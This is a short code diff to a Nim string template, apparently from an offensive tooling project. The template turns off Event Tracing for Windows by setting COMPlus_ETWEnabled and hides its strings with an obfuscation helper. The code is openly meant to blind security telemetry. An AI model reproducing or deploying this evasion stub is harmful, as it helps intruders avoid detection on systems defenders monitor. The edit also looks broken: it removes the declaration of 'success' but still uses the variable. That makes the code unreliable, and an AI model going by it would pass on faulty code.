@@ -933,6 +933,7 @@ when isMainModule:
 
 
 let ETWCOMVARStub * = """
+import os
 proc BlockETW(): bool =
     # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
     var cometw: string = obf("COMPlus_ETWEnabled")
@@ -941,7 +942,7 @@ proc BlockETW(): bool =
     return true
 
 when isMainModule:
-    var success = BlockETW()
+    success = BlockETW()
     when defined(verbose):
         echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
 """
